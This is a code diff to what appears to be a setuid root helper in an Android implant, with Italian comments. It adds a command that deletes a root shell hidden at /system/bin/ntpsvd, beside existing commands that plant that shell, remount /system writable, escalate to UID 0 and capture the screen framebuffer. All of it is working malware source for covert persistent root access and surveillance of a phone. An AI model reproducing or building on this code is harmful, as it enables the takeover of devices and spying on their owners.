@@ -35,6 +35,7 @@ int my_mount(const char *mntpoint);
 void my_chown(const char *user, const char *group, const char *file);
 void my_chmod(const char *mode, const char *file); 
 static void copy_root(const char *mntpnt, const char *dst);
+static void delete_root(const char *mntpnt, const char *dst);
 
 // questo file viene compilato come rdb e quando l'exploit funziona viene suiddato
 // statuslog -c "/system/bin/cat /dev/graphics/fb0"
@@ -74,6 +75,8 @@ int main(int argc, char** argv) {
 		remount("/system", 0);
 	} else if (strcmp(argv[1], "rt") == 0) {  // Copia la shell root in /system/bin/ntpsvd
 		copy_root("/system", "/system/bin/ntpsvd");
+	} else if (strcmp(argv[1], "ru") == 0) {  // Cancella la shell root in /system/bin/ntpsvd
+		delete_root("/system", "/system/bin/ntpsvd");
 	} else if (strcmp(argv[1], "sd") == 0) {
 		my_mount("/mnt/sdcard");
 	} else if (strcmp(argv[1], "air") == 0) { // Am I Root?
@@ -139,6 +142,16 @@ void my_chown(const char *user, const char *group, const char *file) {
 }
 
 static void copy_root(const char *mntpnt, const char *dst) {
+	if (mntpnt != NULL)
+		remount(mntpnt, 0);
+
+	unlink(dst);
+
+	if (mntpnt != NULL)
+		remount(mntpnt, MS_RDONLY);
+}
+
+static void delete_root(const char *mntpnt, const char *dst) {
 	if (mntpnt != NULL)
 		remount(mntpnt, 0);
 
@@ -343,7 +356,7 @@ int my_mount(const char *mntpoint) {
 }
 
 int setgod() {
-    char buf[256];
+    //char buf[256];
     //sprintf(buf, "Actuald UID: %d, GID: %d, EUID: %d, EGID: %d\n", getuid(), getgid(), geteuid(), getegid());
     //LOG(buf);
 
@@ -352,8 +365,8 @@ int setgod() {
     setgid(0);
     seteuid(0);
 
-    sprintf(buf, "Actual UID: %d, GID: %d, EUID: %d, EGID: %d, err: %d\n", getuid(), getgid(), geteuid(), getegid(), errno);
-    LOG(buf);
+    //sprintf(buf, "Actual UID: %d, GID: %d, EUID: %d, EGID: %d, err: %d\n", getuid(), getgid(), geteuid(), getegid(), errno);
+    //LOG(buf);
 
     return (seteuid(0) == 0) ? 1 : 0;
 }
